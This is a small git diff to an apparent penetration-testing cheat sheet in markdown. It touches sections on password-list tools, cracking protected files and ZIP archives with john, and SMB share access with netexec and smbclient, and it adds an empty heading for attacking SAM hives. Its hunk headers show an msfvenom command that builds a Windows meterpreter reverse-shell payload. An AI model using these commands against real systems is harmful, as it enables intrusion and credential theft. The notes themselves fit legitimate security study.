@@ -96,11 +96,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx 
     3. password generation tool
         3a. https://github.com/digininja/CeWL
     4. https://github.com/Mebus/cupp
-
-
 ```
 
 <br>
+
 ### Cracking Protected Files 
 ```
 # Find protected files 
@@ -118,7 +117,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx 
     3. john ssh.hash --show 
 
 ```
+
 <br>
+
 ### Cracking archived / ZIP files 
 ```
 # Get list of compression ext
@@ -178,6 +179,15 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx 
     Netexec: netexec smb [ip] -u "user" -p "password" --shares
 
     # Use SMB Client to communicate with the shares once you have creds 
+    smbclient -U user \\\\[ip]\\SHARENAME
+
+```
+
+
+### Attacking SAM, SYSTEM, & SECURITY 
+```
+
+
 
 
 ```
